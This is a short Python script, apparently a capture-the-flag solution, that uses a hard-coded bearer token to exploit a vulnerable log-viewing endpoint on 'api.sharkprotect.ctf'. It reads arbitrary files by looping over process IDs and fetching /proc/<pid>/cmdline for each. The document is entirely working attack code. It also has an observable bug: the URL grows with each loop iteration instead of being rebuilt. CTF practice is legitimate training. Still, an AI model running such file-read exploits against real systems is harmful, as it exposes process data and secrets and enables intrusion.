import warnings

from requests import Session

s = Session()
s.headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXB0YWluX2hvb2siLCJwcml2aWxlZ2VkX2FjY2VzcyI6ZmFsc2UsImV4cCI6MTc0NzQ1NDk3M30.xL6eTyuZzyU7kbHQwcU3VztGYUOB0CgFP8bSeaT7-zA"
}
url = "https://api.sharkprotect.ctf"
vuln_endpoint = "/v/0.1.4-vuln-query/ship/view-log?log_filename="
with warnings.catch_warnings():
    warnings.simplefilter("ignore")
    for i in range(1, 5000):
        file_path = f"/proc/{i}/cmdline"
        url = f"{url}{vuln_endpoint}{file_path}"
        res = s.get(url)
        if res.status_code != 500:
            print(res.text)
